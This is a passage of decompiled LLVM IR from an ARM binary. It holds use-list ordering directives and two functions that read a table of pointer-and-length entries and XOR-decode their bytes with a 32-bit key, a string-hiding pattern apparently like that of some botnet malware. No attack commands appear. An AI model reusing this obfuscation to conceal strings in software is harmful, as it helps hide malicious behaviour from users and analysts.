  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 35, 31, 44, 36, 0, 1, 2, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 24, 23, 25, 27, 26, 28, 30, 29, 32, 34, 33, 40, 42, 41, 37, 38, 39, 45, 46, 47, 48, 49, 50, 51, 43, 64, 52, 53, 54, 55, 56, 58, 60, 59, 169, 57, 61, 62, 63, 65, 69, 66, 67, 68, 70, 72, 74, 73, 71, 75, 76, 77, 78, 79, 80, 81, 82, 85, 86, 87, 88, 89, 90, 91, 83, 84, 92, 93, 94, 95, 96, 97, 98, 99, 101, 100, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 170 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 46, 47, 41, 42, 35, 14, 15, 0, 1, 2, 39, 40, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 43, 44, 150, 48, 49, 50, 45, 38, 51, 52, 53, 55, 56, 54, 57, 58, 60, 59, 149, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148 }
  uselistorder i32* %r0.global-to-local, { 11, 10, 13, 12, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 29, 28, 31, 30, 32, 33, 126, 125, 35, 127, 111, 113, 112, 100, 99, 128, 130, 129, 34, 37, 36, 38, 114, 1, 0, 2, 4, 3, 6, 5, 7, 8, 9, 117, 40, 39, 41, 43, 42, 44, 45, 47, 46, 48, 50, 49, 51, 53, 52, 54, 55, 56, 57, 58, 59, 61, 60, 63, 62, 65, 64, 66, 67, 68, 69, 71, 70, 73, 72, 75, 74, 76, 77, 78, 79, 81, 80, 83, 82, 85, 84, 86, 87, 88, 89, 91, 90, 93, 92, 95, 94, 96, 97, 98, 102, 101, 106, 103, 104, 105, 119, 118, 121, 120, 109, 110, 116, 115, 134, 131, 132, 123, 122, 124, 107, 133, 136, 135, 137, 138, 140, 139, 141, 147, 142, 143, 146, 144, 145, 148, 150, 151, 149, 108, 153, 154, 246, 155, 156, 245, 157, 152, 158, 159, 160, 162, 161, 163, 164, 166, 165, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 234, 233, 236, 235, 237, 241, 240, 238, 239, 242, 243, 247, 244 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %ip.global-to-local, { 22, 23, 2, 24, 3, 16, 0, 1, 20, 4, 5, 7, 6, 9, 8, 11, 10, 12, 13, 14, 19, 15, 21, 17, 18, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 50, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 55, 105, 104, 106, 107, 108, 10, 11, 80, 81, 82, 83, 84, 0, 1, 6, 7, 2, 3, 4, 5, 8, 99, 12, 13, 14, 135, 15, 16, 17, 18, 19, 20, 25, 26, 21, 22, 23, 24, 27, 28, 29, 34, 35, 30, 31, 32, 33, 36, 37, 38, 43, 44, 39, 40, 41, 42, 45, 46, 47, 52, 53, 48, 49, 50, 51, 54, 56, 57, 61, 62, 58, 59, 60, 63, 101, 72, 77, 78, 73, 74, 75, 76, 79, 100, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 70, 109, 110, 111, 112, 113, 114, 69, 71, 102, 103, 115, 117, 116, 118, 119, 121, 123, 122, 195, 120, 124, 125, 126, 127, 128, 129, 134, 130, 131, 132, 133, 66, 67, 64, 65, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 153, 152, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 191, 171, 172, 173, 174, 175, 190, 176, 177, 178, 189, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 192, 193, 194, 68, 196 }
  uselistorder i1* %cpsr_c.global-to-local, { 9, 10, 11, 57, 104, 103, 105, 106, 107, 12, 82, 83, 84, 85, 0, 1, 6, 7, 2, 3, 4, 5, 8, 98, 13, 14, 15, 133, 16, 17, 18, 19, 20, 21, 22, 27, 28, 23, 24, 25, 26, 29, 30, 31, 36, 37, 32, 33, 34, 35, 38, 39, 40, 45, 46, 41, 42, 43, 44, 47, 48, 49, 54, 55, 50, 51, 52, 53, 56, 58, 59, 63, 64, 60, 61, 62, 65, 100, 74, 79, 80, 75, 76, 77, 78, 81, 99, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 72, 108, 109, 110, 111, 112, 113, 71, 73, 101, 102, 114, 116, 115, 117, 118, 120, 122, 121, 194, 119, 123, 124, 125, 126, 127, 132, 128, 129, 130, 131, 68, 69, 66, 134, 67, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 188, 166, 167, 168, 169, 170, 187, 171, 172, 173, 186, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 189, 190, 191, 192, 193, 70, 195 }
  uselistorder i32 (i32)* @function_10120, { 1, 0 }
  uselistorder i32 104, { 0, 3, 1, 4, 2, 5 }
  uselistorder i8 31, { 7, 1, 2, 0, 3, 4, 8, 5, 6, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 (i32)* @function_122f8, { 39, 38, 40, 37, 36, 35, 34, 33, 32, 31, 41, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @function_122cc, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 60, 61, 62, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 59, 55, 56, 57, 58 }
  uselistorder i32 (i32)* @function_123b0, { 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_15f50.34 to i32*), { 4, 2, 3, 1, 0, 6, 5 }
  uselistorder [3 x i8]* @global_var_15f50.34, { 1, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), { 16, 17, 18, 19, 20, 21, 22, 12, 23, 3, 24, 15, 25, 13, 26, 14, 27, 0, 28, 1, 29, 2, 30, 4, 31, 5, 32, 6, 33, 7, 34, 8, 35, 9, 36, 10, 37, 11, 38 }
  uselistorder i8 58, { 6, 4, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 57, { 6, 4, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 62, { 6, 4, 5, 3, 2, 1, 0 }
  uselistorder i8 61, { 6, 4, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 37, { 5, 3, 4, 2, 1, 0 }
  uselistorder i8 34, { 6, 4, 5, 3, 2, 1, 0, 7, 8, 9, 10 }
  uselistorder i8 36, { 11, 12, 7, 8, 9, 10, 5, 6, 3, 4, 2, 0, 1 }
  uselistorder i8 35, { 12, 13, 8, 9, 10, 11, 6, 7, 4, 5, 2, 3, 0, 1 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_13f00, { 2, 3, 4, 5, 6, 7, 8, 22, 0, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 24, 25, 23, 19, 26, 27, 28, 29, 20, 21, 30 }
  uselistorder i32 251, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 -3, { 1, 2, 3, 0 }
  uselistorder i8 -4, { 1, 2, 3, 0 }
  uselistorder i32 1073741824, { 2, 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_13ea0, { 5, 1, 2, 3, 4, 0, 6, 9, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @function_12da0, { 22, 24, 23, 21, 20, 19, 18, 17, 16, 5, 4, 3, 2, 1, 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6 }
  uselistorder i8* bitcast (i8** @global_var_1ec6c.191 to i8*), { 4, 0, 3, 2, 1 }
  uselistorder i8* @global_var_1ec6d.192, { 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1ec6c.191 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32*, i32)* @function_13e44, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_138bc, { 1, 2, 3, 0 }
  uselistorder i32 284, { 3, 4, 5, 6, 0, 1, 2, 7 }
  uselistorder i32 1544, { 1, 0 }
  uselistorder i32 1672, { 2, 0, 1 }
  uselistorder i32 ()* @function_106a4, { 3, 2, 1, 0 }
  uselistorder i32 254, { 8, 9, 10, 0, 1, 2, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i8 2, { 0, 2, 4, 3, 1 }
  uselistorder i32 5888, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32, i32, i32)* @function_13ecc, { 2, 0, 1 }
  uselistorder i32 (i32, i32*, i32, i32, i32, i32)* @function_13f2c, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 16384, { 32, 52, 33, 53, 34, 54, 35, 55, 36, 56, 37, 57, 13, 58, 12, 69, 11, 50, 0, 51, 1, 59, 2, 60, 3, 61, 4, 62, 5, 63, 6, 64, 7, 65, 8, 66, 30, 67, 31, 68, 28, 71, 29, 72, 27, 70, 38, 91, 9, 92, 10, 93, 14, 80, 39, 81, 16, 73, 42, 74, 41, 75, 43, 76, 44, 77, 15, 78, 40, 79, 17, 82, 18, 83, 19, 84, 45, 46, 20, 85, 21, 86, 23, 87, 22, 88, 24, 89, 25, 90, 48, 94, 49, 95, 26, 96, 47, 97 }
  uselistorder i32 (i32, i32, i32, i32)* @function_e480, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_134c4, { 1, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32)* @function_e424, { 1, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i8* @global_var_1ec50.316, { 2, 1, 0 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 223, { 3, 0, 1, 2 }
  uselistorder i32 192, { 2, 3, 4, 0, 1 }
  uselistorder i32 127, { 5, 0, 6, 3, 7, 1, 8, 2, 9, 4, 10 }
  uselistorder i32 126, { 11, 5, 0, 6, 1, 7, 2, 8, 3, 9, 4, 10 }
  uselistorder i32 ptrtoint (i32* @global_var_16194.302 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1618c.300 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_160fc.266 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_160ec.262 to i32), { 0, 6, 1, 7, 2, 3, 4, 8, 5, 9 }
  uselistorder i32 ptrtoint (i32* @global_var_16158.252 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_160ac.248 to i32), { 0, 5, 1, 2, 3, 6, 4, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_160a4.246 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_16098.244 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_16090.242 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_16088.240 to i32), { 0, 7, 1, 8, 2, 9, 3, 10, 4, 5, 6, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_16070.234 to i32), { 2, 5, 0, 6, 1, 7, 3, 8, 4, 9 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1603c.222 to i32), { 2, 24, 0, 25, 1, 26, 3, 27, 4, 28, 5, 29, 6, 30, 7, 31, 8, 32, 9, 33, 10, 34, 11, 35, 12, 36, 13, 37, 14, 38, 15, 39, 16, 40, 17, 41, 18, 42, 19, 20, 21, 43, 22, 44, 23, 45 }
  uselistorder i32 (i32, i32, i32)* @function_10778, { 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_15f78.220 to i32), { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_161f4.218 to i32), { 2, 28, 3, 29, 4, 30, 5, 31, 6, 32, 0, 33, 7, 34, 8, 35, 9, 36, 10, 37, 11, 38, 12, 39, 13, 40, 14, 41, 15, 42, 16, 43, 17, 18, 19, 44, 20, 45, 21, 46, 22, 47, 23, 48, 1, 49, 24, 50, 25, 51, 26, 52, 27, 53 }
  uselistorder i8* @global_var_1ec61.214, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1ec54.205 to i32), { 3, 2, 4, 5, 0, 6, 1, 7, 8 }
  uselistorder i8 64, { 6, 0, 1, 7, 2, 3, 4, 5 }
  uselistorder i8* @global_var_1ec60.206, { 1, 0 }
  uselistorder i8** @global_var_1ec40.201, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i8** @global_var_1ec40.201 to i32), { 0, 2, 1, 9, 8, 3, 7, 6, 5, 4 }
  uselistorder i32 1024, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 1023, { 4, 0, 1, 2, 5, 3, 6 }
  uselistorder i32 ()* @function_fe60, { 69, 12, 11, 10, 9, 8, 7, 66, 13, 68, 67, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 2, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32*, i32)* @function_13f60, { 8, 0, 1, 2, 3, 4, 9, 5, 6, 7, 10 }
  uselistorder i32 2048, { 14, 13, 5, 8, 9, 0, 1, 2, 3, 7, 10, 6, 11, 4, 12, 15 }
  uselistorder i32* @global_var_1ecd8.199, { 1, 5, 2, 3, 4, 0 }
  uselistorder i32* @global_var_1ecd4.197, { 1, 2, 3, 4, 0 }
  uselistorder i32 288, { 1, 2, 5, 6, 0, 7, 3, 4, 8 }
  uselistorder i32* @global_var_1ec70.185, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32 (i32*)* @function_1396c, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9 }
  uselistorder i32* @global_var_1ecb8.86, { 3, 4, 2, 0, 5, 1, 6, 13, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* @global_var_1ecdc.183, { 0, 2, 1 }
  uselistorder i32 ()* @function_136c8, { 5, 2, 4, 3, 1, 0 }
  uselistorder i32* @fp, { 3, 4, 5, 6, 7, 48, 49, 41, 42, 43, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 1, 38, 39, 40, 44, 2, 45, 46, 47 }
  uselistorder i32* @sl, { 2, 3, 4, 5, 6, 7, 80, 81, 64, 65, 66, 8, 11, 9, 10, 1, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 0, 104, 105, 106, 107 }
  uselistorder i32* @sb, { 3, 4, 7, 1, 2, 5, 6, 59, 58, 8, 9, 60, 61, 49, 50, 51, 10, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 52, 53, 54, 55, 56, 57, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71 }
  uselistorder label %dec_label_pc_122c4, { 1, 0 }
  uselistorder label %dec_label_pc_12220, { 1, 0 }
  uselistorder label %dec_label_pc_12154, { 1, 0 }
  uselistorder label %dec_label_pc_120c0, { 2, 0, 1 }
  uselistorder label %bb344, { 1, 0 }
  uselistorder label %dec_label_pc_12080, { 1, 0 }
  uselistorder label %dec_label_pc_11f4c, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_11f38, { 1, 0 }
  uselistorder label %dec_label_pc_11ee0, { 2, 3, 1, 11, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder label %dec_label_pc_11ec4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11d40, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_11d2c, { 1, 0 }
  uselistorder label %dec_label_pc_11c8c, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_11c78, { 1, 0 }
  uselistorder label %dec_label_pc_11bd8, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_11bc4, { 1, 0 }
  uselistorder label %dec_label_pc_11b24, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_11b10, { 1, 0 }
  uselistorder label %dec_label_pc_11a98, { 1, 0 }
  uselistorder label %dec_label_pc_11a8c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_11a78, { 1, 0 }
  uselistorder label %dec_label_pc_119fc, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_119e8, { 1, 0 }
  uselistorder label %dec_label_pc_118a0, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_11890, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %bb318, { 2, 1, 0 }
  uselistorder label %bb315, { 2, 1, 0 }
  uselistorder label %dec_label_pc_117f0, { 1, 0 }
  uselistorder label %dec_label_pc_117f0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_11778, { 1, 0 }
  uselistorder label %bb312, { 1, 0 }
  uselistorder label %dec_label_pc_11728, { 1, 0 }
  uselistorder label %dec_label_pc_11718, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11710thread-pre-split, { 4, 5, 3, 7, 2, 6, 1, 8, 0, 9 }
  uselistorder label %dec_label_pc_11710thread-pre-split.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_11718.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1170c.loopexit, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_116cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_115a8, { 6, 7, 3, 4, 0, 5, 1, 2 }
  uselistorder label %dec_label_pc_11584, { 1, 0 }
  uselistorder label %bb309, { 1, 0 }
  uselistorder label %bb307, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_113ec.dec_label_pc_113ec_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_113d0.dec_label_pc_113d0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_113c8, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_113c0, { 1, 0 }
  uselistorder label %dec_label_pc_11374, { 1, 0 }
  uselistorder label %dec_label_pc_11214, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_11208, { 1, 0 }
  uselistorder label %.thread47, { 2, 1, 0 }
  uselistorder label %.thread45, { 1, 0 }
  uselistorder label %dec_label_pc_1106c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11048, { 1, 0 }
  uselistorder label %dec_label_pc_1103c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11018, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10ff4, { 1, 0 }
  uselistorder label %bb279, { 1, 0 }
  uselistorder label %dec_label_pc_10fa0, { 22, 6, 7, 2, 8, 3, 9, 4, 10, 5, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 23 }
  uselistorder label %dec_label_pc_10a44, { 1, 0 }
}

define i32 @function_122cc(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_122cc:
  %v3_122d0 = mul i32 %arg1, 8
  %v2_122d4 = add i32 %v3_122d0, ptrtoint (i32* @global_var_1ece4.338 to i32)
  %v2_122d8 = icmp eq i32* %arg2, null
  br i1 %v2_122d8, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_122cc
  %v3_122e411 = inttoptr i32 %v2_122d4 to i32*
  %v4_122e412 = load i32, i32* %v3_122e411, align 4
  br label %bb15

bb:                                               ; preds = %dec_label_pc_122cc
  %v2_122dc = add i32 %v3_122d0, add (i32 ptrtoint (i32* @global_var_1ece4.338 to i32), i32 5)
  %v3_122dc = inttoptr i32 %v2_122dc to i8*
  %v4_122dc = load i8, i8* %v3_122dc, align 1
  %v5_122dc = zext i8 %v4_122dc to i32
  store i32 %v5_122dc, i32* @r2, align 4
  %v2_122e0 = add i32 %v3_122d0, add (i32 ptrtoint (i32* @global_var_1ece4.338 to i32), i32 4)
  %v3_122e0 = inttoptr i32 %v2_122e0 to i8*
  %v4_122e0 = load i8, i8* %v3_122e0, align 4
  %v5_122e0 = zext i8 %v4_122e0 to i32
  %v3_122e4 = inttoptr i32 %v2_122d4 to i32*
  %v4_122e4 = load i32, i32* %v3_122e4, align 4
  %v5_122e8 = mul nuw nsw i32 %v5_122dc, 256
  %v6_122e8 = or i32 %v5_122e0, %v5_122e8
  store i32 %v6_122e8, i32* %arg2, align 4
  br label %bb15

bb15:                                             ; preds = %.thread, %bb
  %v4_122e4714 = phi i32 [ %v4_122e412, %.thread ], [ %v4_122e4, %bb ]
  ret i32 %v4_122e4714

; uselistorder directives
  uselistorder i32 %v2_122d4, { 1, 0 }
  uselistorder i32 %v3_122d0, { 2, 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_122f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_122f8:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_122f8 = mul i32 %arg1, 8
  %v3_122fc = load i32, i32* @r4, align 4
  store i32 %v3_122fc, i32* %stack_var_-20, align 4
  %v3_1230c = and i32 %v3_122f8, 2040
  %v2_12310 = add i32 %v3_1230c, ptrtoint (i32* @global_var_1ece4.338 to i32)
  store i32 %v2_12310, i32* @lr, align 4
  %v1_12318 = add i32 %v3_1230c, add (i32 ptrtoint (i32* @global_var_1ece4.338 to i32), i32 4)
  store i32 %v1_12318, i32* %r7.global-to-local, align 4
  %v2_1231c = load i32, i32* @global_var_1ea98.341, align 4
  %v2_12320 = inttoptr i32 %v1_12318 to i8*
  %v3_12320 = load i8, i8* %v2_12320, align 4
  %v4_12320 = zext i8 %v3_12320 to i32
  store i32 %v4_12320, i32* @r1, align 4
  %v1_12324 = add i32 %v3_1230c, add (i32 ptrtoint (i32* @global_var_1ece4.338 to i32), i32 5)
  %v2_12324 = inttoptr i32 %v1_12324 to i8*
  %v3_12324 = load i8, i8* %v2_12324, align 1
  %v4_12324 = zext i8 %v3_12324 to i32
  %v3_12328 = udiv i32 %v2_1231c, 256
  %v4_1232c = mul nuw nsw i32 %v4_12324, 256
  %v5_1232c = or i32 %v4_1232c, %v4_12320
  %v7_1232c = icmp eq i32 %v5_1232c, 0
  store i1 %v7_1232c, i1* @cpsr_z, align 1
  %v3_12330 = udiv i32 %v2_1231c, 65536
  %v1_12334 = urem i32 %v3_12328, 256
  store i32 %v1_12334, i32* %r6.global-to-local, align 4
  %v1_12338 = urem i32 %v3_12330, 256
  store i32 %v1_12338, i32* %r5.global-to-local, align 4
  %v3_1233c = udiv i32 %v2_1231c, 16777216
  store i32 %v3_1233c, i32* %r4.global-to-local, align 4
  %v1_12340 = urem i32 %v2_1231c, 256
  br i1 %v7_1232c, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_122f8
  store i32 %v3_122fc, i32* @r4, align 4
  ret i32 %v1_12340

bb8:                                              ; preds = %dec_label_pc_122f8
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1234c

dec_label_pc_1234c:                               ; preds = %dec_label_pc_1234c, %bb8
  %v2_12358 = phi i32 [ %v1_12394, %dec_label_pc_1234c ], [ 0, %bb8 ]
  %v0_1234c = phi i32 [ %v0_1238c, %dec_label_pc_1234c ], [ %v2_12310, %bb8 ]
  %v1_1234c = inttoptr i32 %v0_1234c to i32*
  %v2_1234c = load i32, i32* %v1_1234c, align 4
  %v2_12350 = add i32 %v2_1234c, %v2_12358
  %v3_12350 = inttoptr i32 %v2_12350 to i8*
  %v4_12350 = load i8, i8* %v3_12350, align 1
  %v6_12350 = zext i8 %v4_12350 to i32
  %v2_12354 = xor i32 %v6_12350, %v1_12340
  %v1_12358 = trunc i32 %v2_12354 to i8
  store i8 %v1_12358, i8* %v3_12350, align 1
  %v0_1235c = load i32, i32* @lr, align 4
  %v1_1235c = inttoptr i32 %v0_1235c to i32*
  %v2_1235c = load i32, i32* %v1_1235c, align 4
  %v0_12360 = load i32, i32* %ip.global-to-local, align 4
  %v2_12360 = add i32 %v0_12360, %v2_1235c
  %v3_12360 = inttoptr i32 %v2_12360 to i8*
  %v4_12360 = load i8, i8* %v3_12360, align 1
  %v6_12360 = zext i8 %v4_12360 to i32
  %v0_12364 = load i32, i32* %r6.global-to-local, align 4
  %v2_12364 = xor i32 %v0_12364, %v6_12360
  %v1_12368 = trunc i32 %v2_12364 to i8
  store i8 %v1_12368, i8* %v3_12360, align 1
  %v0_1236c = load i32, i32* @lr, align 4
  %v1_1236c = inttoptr i32 %v0_1236c to i32*
  %v2_1236c = load i32, i32* %v1_1236c, align 4
  %v0_12370 = load i32, i32* %ip.global-to-local, align 4
  %v2_12370 = add i32 %v0_12370, %v2_1236c
  %v3_12370 = inttoptr i32 %v2_12370 to i8*
  %v4_12370 = load i8, i8* %v3_12370, align 1
  %v6_12370 = zext i8 %v4_12370 to i32
  %v0_12374 = load i32, i32* %r5.global-to-local, align 4
  %v2_12374 = xor i32 %v0_12374, %v6_12370
  %v1_12378 = trunc i32 %v2_12374 to i8
  store i8 %v1_12378, i8* %v3_12370, align 1
  %v0_1237c = load i32, i32* @lr, align 4
  %v1_1237c = inttoptr i32 %v0_1237c to i32*
  %v2_1237c = load i32, i32* %v1_1237c, align 4
  store i32 %v2_1237c, i32* @r1, align 4
  %v0_12380 = load i32, i32* %ip.global-to-local, align 4
  %v2_12380 = add i32 %v0_12380, %v2_1237c
  %v3_12380 = inttoptr i32 %v2_12380 to i8*
  %v4_12380 = load i8, i8* %v3_12380, align 1
  %v6_12380 = zext i8 %v4_12380 to i32
  %v0_12384 = load i32, i32* %r4.global-to-local, align 4
  %v2_12384 = xor i32 %v0_12384, %v6_12380
  %v1_12388 = trunc i32 %v2_12384 to i8
  store i8 %v1_12388, i8* %v3_12380, align 1
  %v0_1238c = load i32, i32* @lr, align 4
  %v1_1238c = add i32 %v0_1238c, 4
  %v2_1238c = inttoptr i32 %v1_1238c to i8*
